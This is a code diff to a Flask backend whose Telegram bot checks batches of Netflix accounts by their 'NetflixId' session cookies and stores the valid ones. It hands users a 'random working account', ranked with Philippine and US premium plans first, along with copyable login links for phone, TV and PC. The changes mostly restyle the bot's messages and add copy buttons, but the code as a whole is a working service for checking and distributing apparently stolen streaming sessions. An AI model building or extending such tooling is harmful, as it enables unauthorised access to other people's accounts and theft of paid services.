@@ -1503,7 +1503,7 @@ def _telegram_api(method, payload=None, timeout=20):
     return data.get('result')
 
 
-def _telegram_send(chat_id, text):
+def _telegram_send(chat_id, text, reply_markup=None):
     """Send plain text in chunks without ever including cookie values."""
     text = str(text or '')
     chunks = []
@@ -1518,23 +1518,30 @@ def _telegram_send(chat_id, text):
         text = text[split_at:].lstrip('\n')
     try:
         last_message = None
-        for chunk in chunks or ['']:
-            last_message = _telegram_api('sendMessage', {'chat_id': chat_id, 'text': chunk})
+        outgoing_chunks = chunks or ['']
+        for index, chunk in enumerate(outgoing_chunks):
+            payload = {'chat_id': chat_id, 'text': chunk}
+            if reply_markup and index == len(outgoing_chunks) - 1:
+                payload['reply_markup'] = reply_markup
+            last_message = _telegram_api('sendMessage', payload)
         return last_message
     except Exception as exc:
         logger.error(f'Telegram sendMessage failed: {exc}')
         return None
 
 
-def _telegram_edit(chat_id, message_id, text):
+def _telegram_edit(chat_id, message_id, text, reply_markup=None):
     if not message_id:
         return None
     try:
-        return _telegram_api('editMessageText', {
+        payload = {
             'chat_id': chat_id,
             'message_id': message_id,
             'text': str(text or '')[:3500]
-        })
+        }
+        if reply_markup:
+            payload['reply_markup'] = reply_markup
+        return _telegram_api('editMessageText', payload)
     except Exception as exc:
         logger.warning(f'Telegram progress update failed: {exc}')
         return None
@@ -1745,34 +1752,31 @@ def _telegram_results_message(filename, results):
     duplicates = [item for item in results if item.get('status') == 'duplicate']
     invalid = [item for item in results if item.get('status') == 'error']
     lines = [
-        'Batch check complete',
-        f'File: {os.path.basename(filename)}',
-        f'Total: {len(results)}',
-        f'Valid: {len(valid)}',
-        f'Saved/updated in database: {len(saved)}',
-        f'Invalid: {len(invalid)}',
-        f'Duplicates skipped: {len(duplicates)}'
+        '📦 BATCH CHECK COMPLETE',
+        '━━━━━━━━━━━━━━━━━━━━',
+        f'📄 {os.path.basename(filename)}',
+        '',
+        '📊 SUMMARY',
+        f'├ 🔎 Checked: {len(results)}',
+        f'├ ✅ Valid: {len(valid)}',
+        f'├ 💾 Saved/updated: {len(saved)}',
+        f'├ ❌ Invalid: {len(invalid)}',
+        f'└ ♻️ Duplicates skipped: {len(duplicates)}'
     ]
 
     if valid:
-        lines.append('\nValid accounts:')
-        for item in valid[:15]:
+        lines.append('\n✅ VALID ACCOUNTS')
+        for item in valid[:10]:
             email = str(item.get('email') or 'Unknown').replace('\n', ' ')[:100]
             country = str(item.get('country') or 'Unknown')[:20]
             plan = str(item.get('plan') or 'Unknown').replace('\n', ' ')[:80]
-            saved_label = 'saved' if item.get('stored_in_db') else 'not saved'
-            lines.append(f'- {email} | {country} | {plan} | {saved_label}')
-        if len(valid) > 15:
-            lines.append(f'- ...and {len(valid) - 15} more valid account(s)')
+            saved_label = '💾' if item.get('stored_in_db') else '⚠️'
+            lines.append(f'{saved_label} {email}\n   {country} • {plan}')
+        if len(valid) > 10:
+            lines.append(f'\n…and {len(valid) - 10} more valid account(s)')
 
     if invalid:
-        lines.append('\nInvalid accounts:')
-        for item in invalid[:10]:
-            entry_name = os.path.basename(str(item.get('filename') or 'Unknown'))[:80]
-            reason = str(item.get('message') or 'Invalid').replace('\n', ' ')[:120]
-            lines.append(f'- {entry_name}: {reason}')
-        if len(invalid) > 10:
-            lines.append(f'- ...and {len(invalid) - 10} more invalid account(s)')
+        lines.append('\nℹ️ Invalid account details are hidden to keep this report clean.')
     return '\n'.join(lines), {
         'total': len(results),
         'valid': len(valid),
@@ -1861,14 +1865,30 @@ def _telegram_tv_login(code, database_user_id, chat_id, message_id, ip_address):
     return False, f'No usable account was found after {attempts} prioritized attempt(s). Last result: {reason}'
 
 
+def _telegram_login_copy_keyboard(urls):
+    buttons = []
+    for label, key in (
+        ('📱 Copy Phone', 'phone'),
+        ('📺 Copy TV', 'tv'),
+        ('💻 Copy PC', 'pc')
+    ):
+        value = str((urls or {}).get(key) or '')
+        # Telegram CopyTextButton accepts 1-256 characters.
+        if 1 <= len(value) <= 256:
+            buttons.append({'text': label, 'copy_text': {'text': value}})
+    if not buttons:
+        return None
+    return {'inline_keyboard': [buttons[:2], buttons[2:]] if len(buttons) > 2 else [buttons]}
+
+
 def _telegram_random_account(database_user_id, chat_id, message_id, ip_address):
     try:
         candidates = _telegram_priority_pool()
     except Exception as exc:
         logger.exception('Telegram random-account loading failed')
-        return False, f'Unable to load the account pool: {exc}'
+        return False, f'Unable to load the account pool: {exc}', None
     if not candidates:
-        return False, 'No active accounts with both NetflixId cookies are available.'
+        return False, 'No active accounts with both NetflixId cookies are available.', None
 
     for attempt, account in enumerate(candidates, 1):
         _, tier_label = _tv_candidate_priority(account)
@@ -1898,18 +1918,19 @@ def _telegram_random_account(database_user_id, chat_id, message_id, ip_address):
             token=token_result.get('token')
         )
         urls = token_result.get('login_urls') or {}
+        keyboard = _telegram_login_copy_keyboard(urls)
         return True, (
-            f'Random working account ready.\n\n'
-            f'Account: {summary["email"]}\n'
-            f'Country: {summary["country"]}\n'
-            f'Plan: {summary["plan"]}\n'
-            f'Priority group: {tier_label}\n'
-            f'Accounts checked: {attempt}\n\n'
-            f'Phone: {urls.get("phone", "Unavailable")}\n'
-            f'TV browser: {urls.get("tv", "Unavailable")}\n'
-            f'PC: {urls.get("pc", "Unavailable")}'
-        )
-    return False, f'No working account was found after {len(candidates)} prioritized attempt(s).'
+            '🎟️ RANDOM ACCOUNT READY\n'
+            '━━━━━━━━━━━━━━━━━━━━\n'
+            f'👤 Account: {summary["email"]}\n'
+            f'🌍 Country: {summary["country"]}\n'
+            f'👑 Plan: {summary["plan"]}\n'
+            f'🎯 Priority: {tier_label}\n'
+            f'🔎 Accounts checked: {attempt}\n'
+            '━━━━━━━━━━━━━━━━━━━━\n'
+            '👇 Tap a button below to copy the login link.'
+        ), keyboard
+    return False, f'No working account was found after {len(candidates)} prioritized attempt(s).', None
 
 
 @app.route('/api/telegram/webhook', methods=['POST'])
@@ -2002,12 +2023,12 @@ def telegram_webhook():
             'Finding a random working account.\nPriority: PH Premium -> US Premium -> other active subscriptions.'
         )
         progress_id = progress.get('message_id') if isinstance(progress, dict) else None
-        success, result_message = _telegram_random_account(
+        success, result_message, reply_markup = _telegram_random_account(
             database_user_id, chat_id, progress_id, request.remote_addr
         )
-        final_text = ('Success\n\n' if success else 'Random account failed\n\n') + result_message
-        if not _telegram_edit(chat_id, progress_id, final_text):
-            _telegram_send(chat_id, final_text)
+        final_text = result_message if success else '❌ RANDOM ACCOUNT FAILED\n\n' + result_message
+        if not _telegram_edit(chat_id, progress_id, final_text, reply_markup=reply_markup):
+            _telegram_send(chat_id, final_text, reply_markup=reply_markup)
         if update_id is not None:
             _telegram_finish_update(
                 update_id, 'completed', summary={'operation': 'random', 'success': success}
